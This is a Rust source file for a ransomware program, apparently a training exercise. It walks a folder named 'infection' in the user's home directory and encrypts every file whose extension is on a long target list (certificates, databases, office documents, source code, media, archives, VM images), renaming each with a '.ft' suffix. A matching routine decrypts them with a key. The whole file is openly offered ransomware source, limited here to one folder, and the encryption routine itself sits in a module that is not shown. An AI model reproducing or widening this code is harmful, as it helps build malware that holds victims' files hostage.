
use whoami;
use base64::prelude::*;

use crate::encrypt::*;

fn is_file_extension_supported(file_extension: &String) -> bool {
    let file_extensions = [
        ".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw", ".stw",
        ".uot", ".3ds", ".max", ".3dm", ".ods", ".ots", ".sxc", ".stc", ".dif", ".slk", ".wb2",
        ".odp", ".otp", ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm", ".mml", ".lay", ".lay6",
        ".asc", ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb", ".db", ".dbf", ".odb", ".frm",
        ".myd", ".myi", ".ibd", ".mdf", ".ldf", ".sln", ".suo", ".cs", ".c", ".cpp", ".pas", ".h",
        ".asm", ".js", ".cmd", ".bat", ".ps1", ".vbs", ".vb", ".pl", ".dip", ".dch", ".sch", ".brd",
        ".jsp", ".php", ".asp", ".rb", ".java", ".jar", ".class", ".sh", ".mp3", ".wav", ".swf",
        ".fla", ".wmv", ".mpg", ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4", ".3gp", ".mkv",
        ".3g2", ".flv", ".wma", ".mid", ".m3u", ".m4u", ".djvu", ".svg", ".ai", ".psd", ".nef",
        ".tiff", ".tif", ".cgm", ".raw", ".gif", ".png", ".bmp", ".jpg", ".jpeg", ".vcd", ".iso",
        ".backup", ".zip", ".rar", ".7z", ".gz", ".tgz", ".tar", ".bak", ".tbk", ".bz2", ".PAQ",
        ".ARC", ".aes", ".gpg", ".vmx", ".vmdk", ".vdi", ".sldm", ".sldx", ".sti", ".sxi", ".602",
        ".hwp", ".snt", ".onetoc2", ".dwg", ".pdf", ".wk1", ".wks", ".123", ".rtf", ".csv", ".txt",
        ".vsdx", ".vsd", ".edb", ".eml", ".msg", ".ost", ".pst", ".potm", ".potx", ".ppam", ".ppsx",
        ".ppsm", ".pps", ".pot", ".pptm", ".pptx", ".ppt", ".xltm", ".xltx", ".xlc", ".xlm", ".xlt",
        ".xlw", ".xlsb", ".xlsm", ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm", ".docb",
        ".docx", ".doc"
    ];

    file_extensions.contains(&file_extension.as_str())
}

/// Function that get the name of the current user
/// Arguments: 
/// - none
/// Returns:
/// - the name of the current user
fn get_user() -> String {
    let user = whoami::username();
    user
}

/// Function that checks if a folder named "infection" exists
/// in the home directory of the current user
/// Arguments:
/// - none
/// Returns:
/// - true if the folder exists, false otherwise
fn check_infection_folder() -> bool {
    let user = get_user();
    let path = format!("/home/{}/infection", user);
    std::path::Path::new(&path).exists()
}

/// Function that gets all the files in the infection folder
/// and the folders inside the infection folder
/// Arguments:
/// - none
/// Returns:
/// - the Result of the ReadDir
fn get_files_in_infection_folder() -> Result<std::fs::ReadDir, std::io::Error> {
    let user = get_user();
    let path = format!("/home/{}/infection", user);
    std::fs::read_dir(&path)
}

/// Function that gets the extension of a file
/// Arguments:
/// - PathBuf: the path of the file
/// Returns:
/// - the extension of the file
fn get_extension(file: &std::path::PathBuf) -> String {
    // gets the extension and handles all possible errors
    let extension = file.extension();
    match extension {
        Some(extension) => {
            let extension = extension.to_str();
            match extension {
                Some(extension) => {
                    let extension = extension.to_string();
                    let extension = format!(".{}", extension);
                    extension
                },
                None => String::new(),
            }
        }
        None => String::new(),
    }
}

/// Function that writes non utf8 content in a file
/// Arguments:
/// - path: the path of the file
/// - content: the content to write in the file &Vec<u8>
/// Returns:
/// - none
fn safe_write_non_utf8(path: &std::path::PathBuf, content: &Vec<u8>) {
    let result = std::fs::write(&path, content);
    if let Err(e) = result {
        println!("⚠️{:?}: Error while writing: {:?}", path, e);
    }
}

/// Function that writes content in a file
/// and print messages when errors occur
/// Arguments:
/// - path: the path of the file
/// - content: the content to write in the file
/// Returns:
/// - none
fn safe_write(path: &std::path::PathBuf, content: &str) {
    let result = std::fs::write(&path, content);
    if let Err(e) = result {
        println!("⚠️{:?}: Error while writing: {:?}", path, e);
    }
}

/// Function that reads the content of a file
/// and print messages when errors occur
/// it must handle non-utf8 files
/// Arguments:
/// - path: the path of the file
/// Returns:
/// - the content of the file
fn safe_read(path: &std::path::PathBuf) -> String {
    let result = std::fs::read(&path);
    let result = match result {
        Ok(content) => {
            let content = BASE64_STANDARD.encode(content);
            content
        },
        Err(e) => {
            println!("⚠️{:?}: Error while reading: {:?}", path, e);
            String::new()
        }
    };
    result
}

/// Function that encrypts one file
/// Arguments:
/// - DirEntry: the file to encrypt
/// Returns:
/// - none
fn encrypt_file(file: std::fs::DirEntry, silent_mode: &bool) {
    let path = file.path();
    let extension = get_extension(&path);
    if is_file_extension_supported(&extension) {
        let content = safe_read(&path);

        if content.is_empty() {
            return;
        }
        let encrypted_content = encrypt_message(&content);
        safe_write(&path, &encrypted_content);
        if extension != ".ft" {
            let new_path = format!("{}.ft", path.to_str().unwrap());
            std::fs::rename(&path, new_path).unwrap();
        }
        if !silent_mode {
            println!("🔒 {:?}", path);
        }
    }
}

fn encrypt_files(silent_mode: &bool) {
    let files = get_files_in_infection_folder();
    match files {
        Ok(files) => {
            for file in files {
                match file {
                    Ok(file) => {
                        encrypt_file(file, silent_mode);
                    }
                    Err(e) => {
                        println!("⚠️ Error while reading: {:?}", e);
                    }
                }
            }
        }
        Err(e) => {
            println!("⚠️ Error while reading the files: {:?}", e)
        }
    }
}

pub fn ransomware(silent_mode: &bool) {
    let infection_folder = check_infection_folder();
    if !infection_folder {
        println!("⚠️ No infection folder found");
        println!("The program can only encrypt the files in the infection folder");
        return;
    }
    if !silent_mode {
        println!("🔍 Infection folder found");
        println!("🔑 Encrypting files in the infection folder");
    }
    encrypt_files(silent_mode);
}

/// Function that decode base64 String and returens the decoded content
/// Arguments:
/// - content: the content to decode String
/// Returns:
/// - the decoded content String
fn decode_safe(content: &String) -> String {
    let content = BASE64_STANDARD.decode(&content);
    let content = match content {
        Ok(content) => content,
        Err(e) => {
            println!("⚠️ Error while decoding the content: {:?}", e);
            return String::new();
        }
    };
    let content = String::from_utf8(content);
    let content = match content {
        Ok(content) => content,
        Err(e) => {
            println!("⚠️ Error while decoding the content: {:?}", e);
            return String::new();
        }
    };
    content
}

/// Function that decrypts one file
/// Arguments:
/// - DirEntry: the file to decrypt
/// Returns:
/// - none
fn decrypt_file(file: std::fs::DirEntry, key: &str, silent_mode: &bool) {
    let path = file.path();
    let extension = get_extension(&path);
    if extension == ".ft" {
        let content = safe_read(&path);
        let content = decode_safe(&content);
        if content.is_empty() {
            return;
        }
        let decrypted_content = decrypt_message(&content, &key);
        if decrypted_content.is_empty() {
            return;
        }
        let decrypted_content = BASE64_STANDARD.decode(&decrypted_content);
        let decrypted_content = match decrypted_content {
            Ok(content) => content,
            Err(e) => {
                println!("⚠️{:?}: Error while decoding the content: {:?}", path, e);
                return;
            }
        };
        safe_write_non_utf8(&path, &decrypted_content);
        let new_path = path.with_extension("");
        std::fs::rename(&path, new_path.clone()).unwrap();
        if !silent_mode {
            println!("🔓 {:?}", &new_path);
        }
    }
}

/// Function that decrypts all the files in the infection folder
/// Arguments:
/// - none
/// Returns:
/// - none
fn decrypt_files(key: &str, silent_mode: &bool) {
    let files = get_files_in_infection_folder();
    match files {
        Ok(files) => {
            for file in files {
                match file {
                    Ok(file) => {
                        decrypt_file(file, &key, silent_mode);
                    }
                    Err(e) => {
                        println!("⚠️ Error while reading the file: {:?}", e);
                    }
                }
            }
        }
        Err(e) => {
            println!("⚠️ Error while reading the files: {:?}", e)
        }
    }
}

pub fn ransomware_reverse(key: &str, silent_mode: &bool) {
    let infection_folder = check_infection_folder();
    if !infection_folder {
        println!("⚠️ No infection folder found");
        println!("The program can only decrypt the files in the infection folder");
        return;
    }
    if !silent_mode {
        println!("🔍 Infection folder found");
        println!("🔑 Decrypting files in the infection folder");
    }
    decrypt_files(key, silent_mode);
}